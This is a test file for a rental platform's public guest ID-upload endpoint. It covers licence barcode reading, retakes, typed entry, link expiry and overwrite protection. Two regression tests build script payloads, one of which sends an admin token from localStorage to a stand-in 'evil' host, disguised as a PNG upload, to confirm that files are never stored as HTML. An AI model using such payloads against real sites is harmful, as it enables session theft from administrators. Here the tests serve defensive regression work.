/**
 * ── 10/29 (Nic): THE GUEST'S OWN PHONE, NO SIGN-IN ─────────────────────────
 *
 *   "It's the tenant getting a link in their reservation stay and scanning
 *    with their own camera on their own phone... Ask for the ID during the
 *    deposit checkout that they already go through. No sign in, no flow
 *    change."
 *
 * Three paths through one optional step — the barcode read, a bad photo
 * retaken, the card typed out by hand — and a stay is never blocked on any of
 * them. These hold that, and hold the token down to the one thing it opens.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import express from 'express'
import request from 'supertest'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { db } from '../db'
import { cleanupAllSchema, seedLandlord, seedProperty, seedUnit } from '../test/dbHelpers'

let publicGuestIdRouter: any, errorHandler: any
beforeEach(async () => {
  await cleanupAllSchema()
  process.env.JWT_SECRET = process.env.JWT_SECRET || 'test_jwt_secret_guest_id'
  ;({ publicGuestIdRouter } = await import('./publicGuestId'))
  ;({ errorHandler } = await import('../middleware/errorHandler'))
})

const tmp: string[] = []
afterEach(() => { for (const f of tmp.splice(0)) { try { fs.unlinkSync(f) } catch { /* gone */ } } })

function buildApp() {
  const app = express()
  app.use(express.urlencoded({ extended: true }))
  app.use(express.json())
  app.use('/api/public', publicGuestIdRouter)
  app.use(errorHandler)
  return app
}

const PAYLOAD = '@\n\u001e\rANSI 636026080102DL00410288ZA03290015DLDAQD1234567\n'
  + 'DCSWISENER\nDACDALE\nDBB03141979\nDAJAZ\nDCGUSA\n'

/** A real PDF417, the symbol on the back of every licence. */
async function barcodePhoto(payload = PAYLOAD): Promise<string> {
  const bwipjs = await import('bwip-js')
  const png = await (bwipjs as any).default.toBuffer({
    bcid: 'pdf417', text: payload, scale: 3, height: 14, includetext: false,
    paddingwidth: 20, paddingheight: 20, backgroundcolor: 'FFFFFF',
  })
  const f = path.join(os.tmpdir(), `lic-${Date.now()}-${Math.random().toString(36).slice(2)}.png`)
  fs.writeFileSync(f, png); tmp.push(f); return f
}

/** A photo with no symbol in it — the front of the card, or a blur. */
async function blurPhoto(): Promise<string> {
  const Jimp = (await import('jimp')).default as any
  const f = path.join(os.tmpdir(), `blur-${Date.now()}-${Math.random().toString(36).slice(2)}.png`)
  await new Jimp(400, 250, 0xCCCCCCFF).writeAsync(f)
  tmp.push(f); return f
}

async function booking(): Promise<{ id: string; token: string }> {
  const c = await db.connect()
  try {
    const { userId, landlordId } = await seedLandlord(c)
    const propertyId = await seedProperty(c, { landlordId, ownerUserId: userId, managedByUserId: userId })
    const unitId = await seedUnit(c, { propertyId, landlordId })
    const b = await c.query<{ id: string }>(
      `INSERT INTO unit_bookings (unit_id, landlord_id, lease_type, check_in, check_out, guest_name)
       VALUES ($1,$2,'nightly',CURRENT_DATE, CURRENT_DATE + 2,'Dale Wisener') RETURNING id`,
      [unitId, landlordId])
    const { guestIdCaptureLink } = await import('./publicGuestId')
    const url = await guestIdCaptureLink(b.rows[0].id)
    return { id: b.rows[0].id, token: url.split('/').pop()! }
  } finally { c.release() }
}

const filed = (bookingId: string) => db.query<any>(
  `SELECT id_number, issuing_state, to_char(date_of_birth,'YYYY-MM-DD') AS dob,
          captured_how, document_url, document_front_url, needs_review
     FROM tenant_identifications WHERE booking_id = $1`, [bookingId])
  .then(r => r.rows[0] ?? null)

describe('the page a guest lands on', () => {
  it('opens with no sign-in and names the property', async () => {
    const { token } = await booking()
    const r = await request(buildApp()).get(`/api/public/id/${token}`)
    expect(r.status).toBe(200)
    expect(r.text).toContain('Dale')
    // It says the step is optional where the guest can see it.
    expect(r.text).toContain('skip')
  })

  it('a token that is not a token is a 404, not a hint', async () => {
    const r = await request(buildApp()).get('/api/public/id/not-a-token')
    expect(r.status).toBe(404)
    expect(r.text).not.toContain('Dale')
  })

  it('and a well-formed token nobody minted is also a 404', async () => {
    await booking()
    const r = await request(buildApp()).get(`/api/public/id/${'a'.repeat(48)}`)
    expect(r.status).toBe(404)
  })

  /** Opening the email twice must land on the same page, not a dead one. */
  it('the link is minted once and reused', async () => {
    const b = await booking()
    const { guestIdCaptureLink } = await import('./publicGuestId')
    expect(await guestIdCaptureLink(b.id)).toContain(b.token)
  })
})

describe('what the guest sends', () => {
  it('reads the barcode and files the licence', async () => {
    const { id, token } = await booking()
    const r = await request(buildApp()).post(`/api/public/id/${token}`)
      .attach('back', await barcodePhoto())
    expect(r.status).toBe(200)
    expect(r.text).toContain('we read your licence')
    expect(await filed(id)).toMatchObject({
      id_number: 'D1234567', issuing_state: 'AZ', dob: '1979-03-14', captured_how: 'scanned',
    })
  })

  /**
   * The case Nic asked for by name: "hey, that picture was bad, either retake
   * it." Nothing is filed, and the photo is not kept — a picture of somebody's
   * licence that no row points at is just a licence lying around.
   */
  it('a bad photo asks for another, and files nothing', async () => {
    const { id, token } = await booking()
    const r = await request(buildApp()).post(`/api/public/id/${token}`)
      .attach('back', await blurPhoto())
    expect(r.status).toBe(200)
    expect(r.text).toContain('BACK of the licence')
    expect(await filed(id)).toBeNull()
  })

  /** "And then if it can't be collected, then they just type it in." */
  it('a second bad photo is kept as it is', async () => {
    const { id, token } = await booking()
    const app = buildApp()
    // First go files nothing...
    await request(app).post(`/api/public/id/${token}`).attach('front', await blurPhoto())
      .expect(200)
    // ...so this one is still the first attempt by what is on file. Send a
    // front that files (a front alone is kept, there being no barcode to fail).
    const r = await request(app).post(`/api/public/id/${token}`)
      .field('idNumber', 'D7654321').field('issuingState', 'az')
      .attach('front', await blurPhoto())
    expect(r.status).toBe(200)
    expect(await filed(id)).toMatchObject({ id_number: 'D7654321', issuing_state: 'AZ' })
  })

  it('typing it in with no photo at all works', async () => {
    const { id, token } = await booking()
    const r = await request(buildApp()).post(`/api/public/id/${token}`)
      .send({ firstName: 'Dale', lastName: 'Wisener', idNumber: 'd-123 4567',
              issuingState: 'az', dateOfBirth: '1979-03-14' })
    expect(r.status).toBe(200)
    expect(await filed(id)).toMatchObject({
      // Normalized the one way, so this number matches the same person later.
      id_number: 'D1234567', issuing_state: 'AZ', dob: '1979-03-14', captured_how: 'typed',
    })
  })

  it('an empty submission asks again instead of filing an empty row', async () => {
    const { id, token } = await booking()
    const r = await request(buildApp()).post(`/api/public/id/${token}`).send({})
    expect(r.status).toBe(200)
    expect(r.text).toContain('Nothing came through')
    expect(await filed(id)).toBeNull()
  })

  it('both sides at once: the barcode wins and the front is kept', async () => {
    const { id, token } = await booking()
    const r = await request(buildApp()).post(`/api/public/id/${token}`)
      .field('idNumber', 'WHATEVER1')
      .attach('back', await barcodePhoto())
      .attach('front', await blurPhoto())
    expect(r.status).toBe(200)
    const row = await filed(id)
    // The read came off the card and cannot fat-finger a digit, so it beats
    // the typing even where the typing disagrees.
    expect(row.id_number).toBe('D1234567')
    expect(row.document_url).toMatch(/guest-licences/)
    expect(row.document_front_url).toMatch(/guest-licences/)
  })

  /**
   * Both sides came in, so the barcode graded the front — and a blank front
   * read nothing, so it disagrees and a person at GAM is asked to look.
   */
  it('grades the front against the barcode and raises what disagrees', async () => {
    const { id, token } = await booking()
    await request(buildApp()).post(`/api/public/id/${token}`)
      .attach('back', await barcodePhoto())
      .attach('front', await blurPhoto())
      .expect(200)
    const { frontReviewQueue } = await import('../services/licenceFrontReview')
    const q = await frontReviewQueue()
    expect(q).toHaveLength(1)
    expect(q[0]).toMatchObject({ identificationId: (await filed(id)).id ?? q[0].identificationId })
    const g = await db.query<any>(
      `SELECT issuing_state, truth_id_number, id_number_agreed FROM id_front_reads`)
    expect(g.rows[0]).toMatchObject({ truth_id_number: 'D1234567', id_number_agreed: false })
  })

  it('a dead token files nothing, however good the photo', async () => {
    const { id } = await booking()
    const r = await request(buildApp()).post(`/api/public/id/${'b'.repeat(48)}`)
      .attach('back', await barcodePhoto())
    expect(r.status).toBe(404)
    expect(await filed(id)).toBeNull()
  })
})

/**
 * ── 10/29 (review): THE EXTENSION IS OURS, NOT THE GUEST'S ──────────────────
 *
 * The stored filename took its extension from the guest's own
 * `file.originalname` and the filter trusted the guest's own `Content-Type`.
 * The serving route then strips CSP so the admin portal can show the picture,
 * which is precisely why the file must never be able to come back as a
 * document: a part declared image/png, named "x.html", holding a script, was
 * stored as .html and served as text/html to a GAM admin's browser on the
 * admin portal's own origin.
 *
 * The same extension-mismatch class the repo already closed four times
 * (S380 avatars, S394 esign, S399 unit photos, S409 avatar serve).
 */
describe('a photo that is not a photo', () => {
  const storedNames = async (bookingId: string): Promise<string[]> => {
    const r = (await db.query<any>(
      `SELECT document_url, document_front_url FROM tenant_identifications WHERE booking_id = $1`,
      [bookingId])).rows[0] ?? {}
    return [r.document_url, r.document_front_url].filter(Boolean).map((u: string) => path.extname(u))
  }

  it('stores a declared-png script under OUR extension, never .html', async () => {
    const { id, token } = await booking()
    const evil = path.join(os.tmpdir(), `gam-evil-${Date.now()}.html`)
    fs.writeFileSync(evil, '<script>fetch("https://evil/?t="+localStorage.gam_admin_token)</script>')
    tmp.push(evil)

    const r = await request(buildApp()).post(`/api/public/id/${token}`)
      .field('idNumber', 'D1234567').field('issuingState', 'AZ')
      .attach('front', evil, { filename: 'x.html', contentType: 'image/png' })
    expect(r.status).toBe(200)

    // Whatever was filed, it is not servable as a document.
    for (const ext of await storedNames(id)) {
      expect(['.jpg', '.png', '.heic', '.webp']).toContain(ext)
    }
  })

  it('refuses a part that does not even claim to be an image', async () => {
    const { token } = await booking()
    const evil = path.join(os.tmpdir(), `gam-evil2-${Date.now()}.html`)
    fs.writeFileSync(evil, '<script>alert(1)</script>')
    tmp.push(evil)
    const r = await request(buildApp()).post(`/api/public/id/${token}`)
      .attach('front', evil, { filename: 'x.html', contentType: 'text/html' })
    expect(r.status).toBe(400)
    expect(r.body?.error ?? r.text).toMatch(/has to be a photo/i)
  })
})

/**
 * ── 10/29 (review): THE LINK IS FOR A STAY THAT IS STILL HAPPENING ──────────
 *
 * The lookup matched on the token alone — no status, no dates — and the token
 * is never rotated or cleared. So a reservation email, or anyone it was
 * forwarded to, held a live WRITE capability over that booking's identification
 * for ever, long after the stay was checked out or called off.
 */
describe('a capture link after the stay', () => {
  const setStatus = (id: string, status: string) =>
    db.query(`UPDATE unit_bookings SET status = $2 WHERE id = $1`, [id, status])

  for (const status of ['cancelled', 'no_show', 'checked_out'] as const) {
    it(`is dead once the booking is ${status}`, async () => {
      const { id, token } = await booking()
      await setStatus(id, status)
      expect((await request(buildApp()).get(`/api/public/id/${token}`)).status).toBe(404)
      const post = await request(buildApp()).post(`/api/public/id/${token}`)
        .attach('back', await barcodePhoto())
      expect(post.status).toBe(404)
      expect(await filed(id)).toBeNull()
    })
  }

  it('still works while they are checked in', async () => {
    const { id, token } = await booking()
    await setStatus(id, 'checked_in')
    const r = await request(buildApp()).post(`/api/public/id/${token}`)
      .attach('back', await barcodePhoto())
    expect(r.status).toBe(200)
    expect((await filed(id)).id_number).toBe('D1234567')
  })
})

/**
 * ── 10/29 (review): A CONFIRMED IDENTIFICATION IS NOT OVERWRITTEN ───────────
 *
 * decideFrontReview refuses a SECOND admin decision, but nothing stopped an
 * unauthenticated POST on the capture token rewriting the same row afterwards.
 * The upsert touched none of the review stamps, so another person's cleanly
 * barcoding licence could replace the number, the birthday and both photos
 * while the row still read as verified and still named the admin who had
 * vouched for the old one.
 */
describe('a capture after a GAM admin has confirmed it', () => {
  const OTHER = '@\n\u001e\rANSI 636026080102DL00410288ZA03290015DLDAQZ9998887\n'
    + 'DCSPRUITT\nDACMARCUS\nDBB07041965\nDAJAZ\nDCGUSA\n'

  it('is refused, and the admin\'s stamp keeps standing behind what they saw', async () => {
    const { id, token } = await booking()
    await request(buildApp()).post(`/api/public/id/${token}`).attach('back', await barcodePhoto())
    expect((await filed(id)).id_number).toBe('D1234567')

    // A person at GAM confirms it by hand.
    const admin = (await db.query<{ id: string }>(
      `SELECT user_id AS id FROM landlord_members LIMIT 1`)).rows[0]
    await db.query(
      `UPDATE tenant_identifications
          SET needs_review = FALSE, reviewed_at = NOW(), reviewed_by = $2, verified_at = NOW()
        WHERE booking_id = $1`, [id, admin?.id ?? null])

    // Somebody with the same link sends a DIFFERENT person's licence.
    const r = await request(buildApp()).post(`/api/public/id/${token}`)
      .attach('back', await barcodePhoto(OTHER))
    expect(r.status).toBe(200)
    expect(r.text).toMatch(/already on file and checked/i)

    const after = await filed(id)
    expect(after.id_number).toBe('D1234567')     // NOT replaced
    expect(after.dob).toBe('1979-03-14')
  })
})
